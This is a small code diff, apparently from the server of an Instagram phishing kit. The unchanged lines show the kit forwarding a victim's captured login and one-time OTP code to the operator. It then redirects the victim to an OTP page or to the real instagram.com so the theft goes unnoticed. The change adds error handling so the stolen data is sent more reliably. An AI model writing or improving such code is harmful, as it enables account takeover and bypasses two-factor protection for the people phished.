@@ -88,6 +88,7 @@ OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NO OTP LINK"}
 
 Login now: https://www.instagram.com
                                                 `)
+                    .catch(err => console.log(err));
                 if (link.otpEnabled) {
                     return res.redirect("/instagram/otp/" + link.id);
                 } else {
@@ -118,7 +119,9 @@ INSTAGRAM
 
 OTP: ${code}
 
-                `);
+                `)
+                    .catch(err => console.log(err));
+
                 return res.redirect("https://instagram.com")
             }
             else {
